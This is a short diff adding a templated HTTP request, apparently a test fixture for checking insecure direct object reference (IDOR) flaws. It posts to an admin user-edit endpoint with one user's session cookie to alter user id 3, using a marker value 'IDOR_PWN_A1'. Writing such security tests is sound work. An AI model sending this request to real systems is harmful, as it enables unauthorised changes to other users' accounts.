@@ -1,0 +1,5 @@
+POST {{TARGET}}/admin/user-edit HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: {{ALICE_SESSION}}
+
+{{UID_PARAM}}=3&{{SIG_FIELD}}=IDOR_PWN_A1
